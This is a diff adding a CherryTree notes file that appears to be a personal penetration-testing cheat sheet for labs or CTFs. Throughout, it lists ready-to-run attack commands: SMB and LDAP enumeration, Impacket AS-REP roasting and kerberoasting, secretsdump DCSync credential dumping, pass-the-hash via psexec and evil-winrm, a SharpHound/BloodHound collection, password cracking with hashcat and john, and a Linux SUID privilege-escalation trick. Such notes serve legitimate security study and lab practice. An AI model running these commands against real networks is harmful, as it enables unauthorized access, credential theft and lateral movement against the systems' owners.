+
+_________________________________________________
+
+</rich_text>
+        <rich_text scale="h1">SMBMap</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+with specific user:
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+list contents of a directory and subdirectory:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+________________________________________________
+
+</rich_text>
+        <rich_text scale="h2">Enum4linux</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+or
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+_________________________________________
+
+Also check
+
+</rich_text>
+        <rich_text link="node 41">CrackMapExec</rich_text>
+        <rich_text>
+</rich_text>
+        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 192.168.162.220</codebox>
+        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 192.168.162.220</codebox>
+        <codebox char_offset="104" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.162.220</codebox>
+        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.162.220 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
+        <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 192.168.162.220</codebox>
+        <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 192.168.162.220</codebox>
+        <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 192.168.162.220</codebox>
+      </node>
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1687690428">
+        <rich_text>
+
+
+</rich_text>
+        <rich_text link="webs https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text link="webs https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text link="webs https://tools.thehacker.recipes/">https://tools.thehacker.recipes/</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
+        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1687690728">
+          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690744">
+            <rich_text scale="h1">Request AS_REP message</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text scale="h3">Using Impacket</rich_text>
+            <rich_text>
+
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+</rich_text>
+            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
+python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+
+### Use domain creds to extract targets and target them
+python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+
+
+### Get  ASREPMessage without pass  
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass
+
+
+or
+
+python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 192.168.162.220
+</codebox>
+          </node>
+          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690752">
+            <rich_text>
+</rich_text>
+            <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
+            <rich_text> (DC Sync aka synchronizing DC)
+
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+</rich_text>
+            <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
+or 
+impacket-secretsdump domain.local/user@192.168.162.220</codebox>
+          </node>
+          <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
+            <rich_text>Exploitation via pass the hash
+
+
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+or
+
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text foreground="#d4d4d4">or</rich_text>
+            <rich_text>
+
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+
+</rich_text>
+            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.162.220 -hashes randomLMHASH:oeasdNTLMHASH
+</codebox>
+            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@192.168.162.220 </codebox>
+            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@192.168.162.220</codebox>
+          </node>
+          <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
+            <rich_text>
+</rich_text>
+            <rich_text foreground="#79c0ff" weight="heavy">### This script will gather data about the domain's users and their corresponding email addresses.</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text foreground="#c9d1d9">```</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text foreground="#c9d1d9">```</rich_text>
+            <rich_text>
+or
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+</rich_text>
+            <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
+or
+impacket-GetADUsers domain/user:password@IP</codebox>
+            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 192.168.162.220</codebox>
+          </node>
+          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
+            <rich_text>
+</rich_text>
+            <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 192.168.162.220 domain.local/user</codebox>
+          </node>
+        </node>
+        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1687690728">
+          <rich_text>
+
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+or
+
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+</rich_text>
+          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 192.168.162.220 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
+          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.162.220 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
+          <codebox char_offset="11" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
+        </node>
+        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1687690347">
+          <rich_text>
+</rich_text>
+          <rich_text scale="h2">
+Setting password for user sophie</rich_text>
+          <rich_text>
+
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+______________________________
+
+
+</rich_text>
+          <rich_text scale="h2">Force any particular computer to sync its GPOs immediate</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+________________________________
+
+
+</rich_text>
+          <rich_text scale="h2">Use powershell specifically for all the below commands:
+</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text scale="h3">Testing Connection/Access</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+____________________________________
+</rich_text>
+          <rich_text scale="h2">CMD</rich_text>
+          <rich_text>
+
+
+</rich_text>
+          <rich_text scale="h3">Running as a different user on an AD</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
+          <codebox char_offset="131" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
+          <codebox char_offset="253" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
+or
+
+# Test if HTTP port is open
+Test-NetConnection google.com -CommonTCPPort "Http"
+
+# Or define a port number
+Test-NetConnection google.com -Port 80</codebox>
+          <codebox char_offset="337" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"
+
+or  like ippsec writeup
+
+runas /netonly /user:domain.local\user cmd
+</codebox>
+        </node>
+        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1687690808">
+          <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+</rich_text>
+          <rich_text scale="h3">Enumerating all the shares with a given password</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+ 
+</rich_text>
+          <rich_text scale="h4"> Checking Pass the Hash</rich_text>
+          <rich_text>
+ 
+ </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+ 
+</rich_text>
+          <rich_text scale="h3"> Listing all the shares</rich_text>
+          <rich_text>
+ 
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text scale="h3">Null Authentication smb Enumeration</rich_text>
+          <rich_text>
+
+ </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+
+</rich_text>
+          <rich_text scale="h3">Anonymous Authentication smb Enum</rich_text>
+          <rich_text>
+ </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+ 
+ 
+</rich_text>
+          <rich_text scale="h3">  </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text scale="h2"> Adding Domain with -d</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text> 
+</rich_text>
+          <rich_text scale="h3"> Checking all the files in the share</rich_text>
+          <rich_text>
+ 
+ </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+ 
+</rich_text>
+          <rich_text scale="h3"> checking usernames and passwords line by line (not using all the passwords for each user)</rich_text>
+          <rich_text>
+ 
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.220</codebox>
+          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.220 -u &lt;username&gt; -p &lt;password&gt; --shares
+
+Ex:
+
+crackmapexec smb 192.168.162.220 -u admin -p abcd1234 --shares</codebox>
+          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.220 -u admin -H reallybighashvalue</codebox>
+          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 192.168.162.220 --shares
+ </codebox>
+          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.220 --shares -u '' -p ''</codebox>
+          <codebox char_offset="230" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.220 --shares -u 'randomanon' -p ''</codebox>
+          <codebox char_offset="238" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.220 -u admin -H reallybighashvalue</codebox>
+          <codebox char_offset="263" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
+          <codebox char_offset="264" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+</codebox>
+          <codebox char_offset="307" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.220 -U validuser.txt -P password.txt -M spider-plus </codebox>
+          <codebox char_offset="308" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
+          <codebox char_offset="405" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 192.168.162.220  -U validuser.txt -P password.txt -M spider-plus --no-bruteforce</codebox>
+        </node>
+        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1687725851">
+          <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+For Domain Joined simply run
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+Once Done download the zip file and upload it in bloodhound by dragging and dropping
+
+First always check the pwned users and mark them owned before checking anything else
+
+
+Once Done download the zip file and upload it in bloodhound by dragging and dropping
+
+First always check the pwned users and mark them owned before checking anything else
+
+
+
+_______________________________________________
+
+
+</rich_text>
+          <rich_text scale="h3">running bloodhound from attack machine using python</rich_text>
+          <rich_text>
+
+First install via
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+then
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+or 
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+where </rich_text>
+          <rich_text family="monospace">ns</rich_text>
+          <rich_text> is the name server aka dns
+
+</rich_text>
+          <rich_text scale="h3">To get more infor use:</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+where -c is for collection all</rich_text>
+          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 192.168.162.220</codebox>
+          <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
+          <codebox char_offset="599" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
+          <codebox char_offset="608" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 bloodhound.py --dns-tcp -ns 192.168.162.220 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
+          <codebox char_offset="616" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.162.220 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
+          <codebox char_offset="681" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.162.220 -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
+        </node>
+        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1687690429">
+          <rich_text scale="h3">Using Ldapsearch</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -h support.htb -D ‘ldap@support.htb’ -w 'password -b 'dc=support,dc=htb'</codebox>
+        </node>
+      </node>
+      <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
+        <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
+        <rich_text>
+
+   ☐  nmap -sn 192.168.162.220
+   ☐  nmap -sL 192.168.162.220
+   ☐  nbtscan -r 192.168.162.220
+
+</rich_text>
+        <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
+        <rich_text>
+
+   ☐  nmap  --top-ports 20 --open -iL iplist.txt
+   ☐  nmap -sS -A -sV -O -p- 192.168.162.220
+   ☐  nmap -sU 192.168.162.220
+</rich_text>
+      </node>
+      <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
+        <rich_text>
+</rich_text>
+        <rich_text scale="h2">Nmap</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+Download all the files
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+Connecting:
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 192.168.162.220</codebox>
+        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@192.168.162.220'</codebox>
+        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 192.168.162.220</codebox>
+      </node>
+      <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1687689975">
+        <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
+          <rich_text>• use pspy64
+• use linpeas
+• check sudo -l
+• check SUID with the following
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text family="monospace">
+</rich_text>
+          <rich_text>
+PS: A binary can be changed to </rich_text>
+          <rich_text family="monospace">SUID</rich_text>
+          <rich_text> by using </rich_text>
+          <rich_text family="monospace">chmod u+s /bin/bash</rich_text>
+          <rich_text>
+
+• check do as via:
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text family="monospace">
+</rich_text>
+          <rich_text>
+
+References:
+◇ </rich_text>
+          <rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
+          <rich_text>
+◇ </rich_text>
+          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
+          <rich_text>
+
+  </rich_text>
+          <codebox char_offset="76" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -u=s -type f 2&gt;/dev/null
+or 
+find / -perm -4000 2&gt;/dev/null</codebox>
+          <codebox char_offset="165" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -type f -name doas.conf 2&gt;/dev/null</codebox>
+        </node>
+      </node>
+      <node name="Password-Cracking" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690527" ts_lastsave="1687691201">
+        <rich_text scale="h3">Cracking</rich_text>
+        <rich_text> AD Hashes from ASRepRoasting
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+____________________________________________
+
+
+</rich_text>
+        <rich_text scale="h3">Cracking TGTs</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+____________________________________________
+
+</rich_text>
+        <rich_text scale="h3">Cracking cpassword from old computers with GPP group policy</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+___________________________-
+
+
+</rich_text>
+        <rich_text scale="h2">for NTLMv2 hashes</rich_text>
+        <rich_text>
+
+
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+</rich_text>
+        <codebox char_offset="39" justification="left" frame_width="1090" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=passwords_kerb.txt hashes.asreproast
+
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+
+oro1
+
+hashcat -m 18200 unhashedgetNPUsers.log passwordlist.txt</codebox>
+        <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashTGT.log /opt/wordlist/rockyou.txt</codebox>
+        <codebox char_offset="213" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt eHHHHyourReallyLongHash</codebox>
+        <codebox char_offset="269" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -a 0 -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txts</codebox>
+      </node>
+      <node name="Vulnerabilities" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690556" ts_lastsave="1687690564">
+        <node name="SQLInjection" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690564" ts_lastsave="1687690570">
+          <rich_text link="webs https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md">https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text scale="h3">connecting to sql</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+This prompts me to log into MySQL. I use the password given, then type:
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+For help check
+
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+</rich_text>
+          <codebox char_offset="95" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql -u dbuser -p password</codebox>
+          <codebox char_offset="171" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">use drupaldb;</codebox>
+          <codebox char_offset="191" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql --help</codebox>
+        </node>
+      </node>
+    </node>
+  </node>
+</cherrytree>
